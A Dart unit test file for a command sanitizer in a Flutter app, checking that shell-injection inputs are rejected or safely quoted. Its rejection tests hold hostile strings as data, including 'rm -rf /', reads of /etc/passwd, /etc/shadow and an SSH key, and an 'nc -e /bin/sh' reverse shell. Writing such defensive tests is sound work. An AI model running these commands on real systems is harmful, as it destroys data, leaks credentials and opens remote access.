import 'package:flutter_test/flutter_test.dart';
import 'package:othrys/core/security/command_sanitizer.dart';

void main() {
  group('CommandSanitizer (CRITICAL SECURITY)', () {
    // 5 Valid test cases
    test('validates and escapes normal POSIX path', () {
      final safe = CommandSanitizer.sanitizePath('/var/log/nginx/access.log');
      expect(safe, "'/var/log/nginx/access.log'");
    });

    test('validates safe identifier', () {
      expect(CommandSanitizer.sanitizeIdentifier('nginx-service.1'), 'nginx-service.1');
      expect(CommandSanitizer.sanitizeIdentifier('docker_container_99'), 'docker_container_99');
    });

    test('builds safe command with quoted arguments', () {
      final cmd = CommandSanitizer.buildSafeCommand('systemctl', ['restart', 'nginx.service']);
      expect(cmd, "systemctl 'restart' 'nginx.service'");
    });

    test('validates port in valid range', () {
      expect(CommandSanitizer.isValidPort(22), isTrue);
      expect(CommandSanitizer.isValidPort(80), isTrue);
      expect(CommandSanitizer.isValidPort(65535), isTrue);
    });

    test('validates valid hostnames and IPs', () {
      expect(CommandSanitizer.isValidHostname('vps.example.com'), isTrue);
      expect(CommandSanitizer.isValidHostname('192.168.1.1'), isTrue);
      expect(CommandSanitizer.isValidHostname('localhost'), isTrue);
      expect(CommandSanitizer.isValidHostname('2001:db8::1'), isTrue);
    });

    // 5 Injections rejected test cases
    test('rejects shell semicolon injection in path', () {
      expect(
        () => CommandSanitizer.sanitizePath('/var/www; rm -rf /'),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('rejects shell subshell \$(...) injection in path', () {
      expect(
        () => CommandSanitizer.sanitizePath('/tmp/\$(cat /etc/passwd)'),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('rejects backtick injection in path', () {
      expect(
        () => CommandSanitizer.sanitizePath('/home/user/`whoami`'),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('rejects malicious command chaining in identifier', () {
      expect(
        () => CommandSanitizer.sanitizeIdentifier('nginx; cat /etc/shadow'),
        throwsA(isA<ArgumentError>()),
      );
      expect(
        () => CommandSanitizer.sanitizeIdentifier('service && reboot'),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('rejects invalid ports and invalid hostnames', () {
      expect(CommandSanitizer.isValidPort(0), isFalse);
      expect(CommandSanitizer.isValidPort(70000), isFalse);
      expect(CommandSanitizer.isValidPort(-1), isFalse);

      expect(CommandSanitizer.isValidHostname('bad host with spaces'), isFalse);
      expect(CommandSanitizer.isValidHostname('host;drop table'), isFalse);
      expect(CommandSanitizer.isValidHostname(''), isFalse);
    });

    test('buildSafeCommand escapes malicious argument without command injection', () {
      final cmd = CommandSanitizer.buildSafeCommand('systemctl', ['stop', "nginx; rm -rf /"]);
      expect(cmd, "systemctl 'stop' 'nginx; rm -rf /'");
    });

    test('rejects pipe injection in path', () {
      expect(
        () => CommandSanitizer.sanitizePath('/var/log | nc -e /bin/sh 1.2.3.4'),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('rejects logical OR || injection in path', () {
      expect(
        () => CommandSanitizer.sanitizePath('/var/log || echo pwned'),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('rejects shell variable expansion in path', () {
      expect(
        () => CommandSanitizer.sanitizePath('/home/\$USER/.ssh/id_rsa'),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('rejects newline character in identifier', () {
      expect(
        () => CommandSanitizer.sanitizeIdentifier("service\nreboot"),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('rejects redirect operators in path', () {
      expect(
        () => CommandSanitizer.sanitizePath('/etc/shadow > /tmp/leaked'),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('rejects identifiers starting with hyphen to prevent option injection', () {
      expect(() => CommandSanitizer.sanitizeIdentifier('-v'), throwsA(isA<ArgumentError>()));
      expect(() => CommandSanitizer.sanitizeIdentifier('--help'), throwsA(isA<ArgumentError>()));
      expect(() => CommandSanitizer.sanitizeIdentifier('--upload-pack=evil'), throwsA(isA<ArgumentError>()));
      expect(() => CommandSanitizer.sanitizeIdentifier('-rf'), throwsA(isA<ArgumentError>()));
    });

    test('validates port and port ranges with isValidPortOrRange', () {
      expect(CommandSanitizer.isValidPortOrRange('80'), isTrue);
      expect(CommandSanitizer.isValidPortOrRange('443'), isTrue);
      expect(CommandSanitizer.isValidPortOrRange('8000:8080'), isTrue);
      expect(CommandSanitizer.isValidPortOrRange('1:65535'), isTrue);

      expect(CommandSanitizer.isValidPortOrRange(''), isFalse);
      expect(CommandSanitizer.isValidPortOrRange('0'), isFalse);
      expect(CommandSanitizer.isValidPortOrRange('70000'), isFalse);
      expect(CommandSanitizer.isValidPortOrRange('8080:8000'), isFalse); // inverted
      expect(CommandSanitizer.isValidPortOrRange('80; rm -rf /'), isFalse);
      expect(CommandSanitizer.isValidPortOrRange('22\$(reboot)'), isFalse);
    });

    test('validates IP addresses and CIDR notations with isValidIpOrCidr', () {
      expect(CommandSanitizer.isValidIpOrCidr('192.168.1.1'), isTrue);
      expect(CommandSanitizer.isValidIpOrCidr('10.0.0.0/24'), isTrue);
      expect(CommandSanitizer.isValidIpOrCidr('::1'), isTrue);
      expect(CommandSanitizer.isValidIpOrCidr('2001:db8::/32'), isTrue);

      expect(CommandSanitizer.isValidIpOrCidr(''), isFalse);
      expect(CommandSanitizer.isValidIpOrCidr('192.168.1.1/33'), isFalse);
      expect(CommandSanitizer.isValidIpOrCidr("192.168.1.1' || reboot"), isFalse);
      expect(CommandSanitizer.isValidIpOrCidr('not an ip'), isFalse);
    });

    test('validates docker-compose tokens with isValidComposeToken', () {
      expect(CommandSanitizer.isValidComposeToken('-d'), isTrue);
      expect(CommandSanitizer.isValidComposeToken('--build'), isTrue);
      expect(CommandSanitizer.isValidComposeToken('--scale=web=2'), isTrue);
      expect(CommandSanitizer.isValidComposeToken('web'), isTrue);
      expect(CommandSanitizer.isValidComposeToken('docker-compose.yml'), isTrue);

      expect(CommandSanitizer.isValidComposeToken('; rm -rf /'), isFalse);
      expect(CommandSanitizer.isValidComposeToken('web && reboot'), isFalse);
      expect(CommandSanitizer.isValidComposeToken('`whoami`'), isFalse);
      expect(CommandSanitizer.isValidComposeToken(r'$(cat /etc/passwd)'), isFalse);
    });
  });
}
